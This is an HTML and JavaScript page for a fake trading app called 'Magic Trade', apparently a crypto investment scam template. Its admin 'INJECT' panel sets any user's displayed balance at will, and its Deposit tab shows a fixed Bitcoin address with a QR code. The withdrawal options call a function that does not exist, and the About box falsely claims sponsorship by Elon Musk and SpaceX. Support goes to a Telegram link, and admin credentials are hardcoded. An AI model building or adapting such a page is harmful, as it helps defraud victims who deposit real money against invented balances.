<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Magic Trade | Global Node</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        body { background: #010409; color: #e6edf3; font-family: -apple-system, system-ui, sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        .magic-card { background: #0d1117; border: 1px solid #30363d; border-radius: 12px; }
        .magic-gradient { background: linear-gradient(90deg, #1f6feb 0%, #388ed1 100%); }
        .bottom-nav { background: #0d1117; border-top: 1px solid #30363d; position: fixed; bottom: 0; width: 100%; display: flex; justify-content: space-around; padding: 12px 0; z-index: 100; }
        .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 10px; color: #8b949e; }
        .nav-active { color: #58a6ff; }
        input { background: #0d1117 !important; border: 1px solid #30363d !important; color: white !important; }
        .setting-row { display: flex; justify-content: space-between; align-items: center; padding: 16px; border-bottom: 1px solid #161b22; cursor: pointer; }
    </style>
</head>
<body>

    <div id="auth-screen" class="fixed inset-0 z-[200] flex flex-col items-center justify-center bg-[#010409] p-6 text-center">
        <h1 class="text-4xl font-black mb-1 text-white tracking-tighter">MAGIC<span class="text-blue-500">TRADE</span></h1>
        <p class="text-[9px] text-slate-500 tracking-[0.4em] mb-10 uppercase">Global Institutional Terminal</p>
        <div class="magic-card p-6 w-full max-w-sm space-y-4">
            <input type="text" id="reg-name" placeholder="Full Name" class="hidden w-full p-4 rounded-xl text-sm outline-none">
            <input type="email" id="email" placeholder="Email / ID" class="w-full p-4 rounded-xl text-sm outline-none">
            <input type="password" id="pass" placeholder="Password" class="w-full p-4 rounded-xl text-sm outline-none">
            <button onclick="handleAuth()" id="main-btn" class="w-full magic-gradient p-4 rounded-xl font-bold uppercase text-xs tracking-widest active:scale-95">Connect</button>
            <button onclick="toggleAuth()" id="toggle-btn" class="text-xs text-blue-500 font-bold block mx-auto mt-4">New User? Register</button>
        </div>
    </div>

    <div id="app" class="hidden flex-col h-screen overflow-hidden">
        <header class="p-4 flex justify-between items-center bg-[#0d1117] border-b border-slate-800">
            <div class="flex items-center gap-3">
                <div class="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center font-bold text-xs" id="avatar">M</div>
                <div>
                    <span id="user-display" class="font-bold text-sm block leading-none text-white">---</span>
                    <span class="text-[9px] text-green-500 font-bold uppercase tracking-widest">Live Node Active</span>
                </div>
            </div>
            <button onclick="showSection('admin')" id="admin-icon" class="hidden text-xl">‚öôÔ∏è</button>
        </header>

        <main class="flex-1 overflow-y-auto pb-24">
            
            <section id="home-sec" class="p-4 space-y-4">
                <div class="magic-card p-6 bg-gradient-to-br from-[#161b22] to-[#0d1117] shadow-xl">
                    <p class="text-slate-500 text-[10px] font-bold uppercase tracking-widest mb-1">Available Equity</p>
                    <h2 class="text-4xl font-mono font-bold text-white tracking-tighter">$ <span id="balance">0.00</span></h2>
                    <div class="grid grid-cols-2 gap-3 mt-6">
                        <button onclick="showSection('deposit')" class="bg-[#238636] py-3 rounded-xl font-bold text-xs uppercase shadow-lg">Deposit</button>
                        <button onclick="showSection('withdraw')" class="bg-slate-800 py-3 rounded-xl font-bold text-xs uppercase">Withdraw</button>
                    </div>
                </div>
                <div class="magic-card overflow-hidden h-[300px]">
                    <iframe src="https://s.tradingview.com/widgetembed/?symbol=BTCUSD&interval=1&theme=dark&style=1" class="w-full h-full"></iframe>
                </div>
            </section>

            <section id="settings-sec" class="hidden">
                <div class="p-6">
                    <h3 class="text-xl font-bold mb-6">Account Settings</h3>
                    <div class="magic-card overflow-hidden">
                        <div class="setting-row"><span>Identity Verification</span><span class="text-green-500 text-[10px] font-bold">LEVEL 2</span></div>
                        <div class="setting-row"><span>Security Center</span><span class="text-slate-500">‚Üí</span></div>
                        <div class="setting-row" onclick="showAbout()"><span>About Magic Trade</span><span class="text-blue-500 text-[10px]">v4.2.0</span></div>
                        <div class="setting-row text-red-500 font-bold" onclick="logout()"><span>Log Out</span></div>
                    </div>
                </div>
            </section>

            <div id="about-box" class="hidden fixed inset-0 z-[300] bg-black/90 backdrop-blur-md p-10 flex flex-col justify-center text-center">
                <h2 class="text-2xl font-black mb-4">MAGIC<span class="text-blue-500">TRADE</span></h2>
                <p class="text-sm text-slate-300 leading-relaxed">
                    Magic Trade is a next-generation high-frequency trading terminal. <br><br>
                    <b class="text-white">Official Sponsor:</b> <br>
                    <span class="text-blue-400 font-bold">Elon Musk / X Holdings (SpaceX Corp)</span> <br><br>
                    Licensed for institutional digital asset management across 140+ countries.
                </p>
                <button onclick="document.getElementById('about-box').classList.add('hidden')" class="mt-10 magic-gradient p-3 rounded-xl font-bold text-xs uppercase">Close</button>
            </div>

            <section id="withdraw-sec" class="hidden p-4 space-y-4">
                <h3 class="text-sm font-bold uppercase text-slate-500 px-2">Select Payout Method</h3>
                <div class="grid grid-cols-1 gap-3">
                    <div onclick="openWithdrawForm('Cash App')" class="p-4 magic-card flex justify-between"><span>Cash App</span><span class="text-green-500 text-xs">Instant</span></div>
                    <div onclick="openWithdrawForm('Apple Pay')" class="p-4 magic-card flex justify-between"><span>Apple Pay</span><span class="text-blue-400 text-xs">Instant</span></div>
                    <div onclick="openWithdrawForm('Zelle')" class="p-4 magic-card flex justify-between"><span>Zelle</span><span class="text-purple-500 text-xs">Instant</span></div>
                </div>
            </section>

            <section id="deposit-sec" class="hidden p-6 text-center">
                <div id="qrcode" class="bg-white p-3 inline-block rounded-2xl mb-4"></div>
                <p class="text-xs font-mono text-blue-400">bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm</p>
            </section>

            <section id="admin-sec" class="hidden p-6">
                <div class="border-2 border-blue-500 p-6 rounded-2xl space-y-4">
                    <input type="email" id="adm-target" placeholder="User Email" class="w-full p-4 rounded-xl text-sm">
                    <input type="number" id="adm-amt" placeholder="Amount" class="w-full p-4 rounded-xl text-sm">
                    <button onclick="adminInject()" class="w-full magic-gradient p-4 rounded-xl font-bold text-xs">INJECT</button>
                </div>
            </section>
        </main>

        <nav class="bottom-nav">
            <button onclick="showSection('home')" class="nav-item"><span>üè†</span><span>Home</span></button>
            <button onclick="window.open('https://t.me/+12156208677')" class="nav-item"><span>üéß</span><span>Support</span></button>
            <button onclick="showSection('settings')" class="nav-item"><span>‚öôÔ∏è</span><span>Settings</span></button>
        </nav>
    </div>

    <script>
        let users = JSON.parse(localStorage.getItem('magic_users')) || { "admin@magic.com": { name: "Root Admin", pass: "boss123", bal: 0, isAdmin: true } };
        let activeSession = localStorage.getItem('magic_session') || null;

        window.onload = () => {
            if(activeSession && users[activeSession]) enterApp(activeSession);
            new QRCode(document.getElementById("qrcode"), { text: "bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm", width: 160, height: 160 });
        };

        function showAbout() { document.getElementById('about-box').classList.remove('hidden'); }
        function handleAuth() {
            const e = document.getElementById('email').value.toLowerCase();
            const p = document.getElementById('pass').value;
            const n = document.getElementById('reg-name').value;
            if(document.getElementById('reg-name').classList.contains('hidden')) {
                if(users[e] && users[e].pass === p) enterApp(e); else alert("Denied.");
            } else {
                if(!e || !p || !n) return;
                users[e] = { name: n, pass: p, bal: 0, isAdmin: false };
                save(); alert("Registered!"); toggleAuth();
            }
        }
        function enterApp(e) {
            activeSession = e; localStorage.setItem('magic_session', e);
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('app').classList.remove('hidden');
            document.getElementById('user-display').innerText = users[e].name;
            if(users[e].isAdmin) document.getElementById('admin-icon').classList.remove('hidden');
            updateUI();
        }
        function showSection(sec) {
            ['home-sec', 'deposit-sec', 'admin-sec', 'withdraw-sec', 'settings-sec'].forEach(s => document.getElementById(s).classList.add('hidden'));
            document.getElementById(sec + '-sec').classList.remove('hidden');
        }
        function adminInject() {
            const t = document.getElementById('adm-target').value.toLowerCase();
            const a = parseFloat(document.getElementById('adm-amt').value);
            if(users[t]) { users[t].bal += a; save(); alert("Capital Injected!"); updateUI(); }
        }
        function updateUI() { document.getElementById('balance').innerText = users[activeSession].bal.toLocaleString(undefined, {minimumFractionDigits: 2}); }
        function toggleAuth() { document.getElementById('reg-name').classList.toggle('hidden'); }
        function save() { localStorage.setItem('magic_users', JSON.stringify(users)); }
        function logout() { localStorage.removeItem('magic_session'); location.reload(); }
    </script>
</body>
</html>
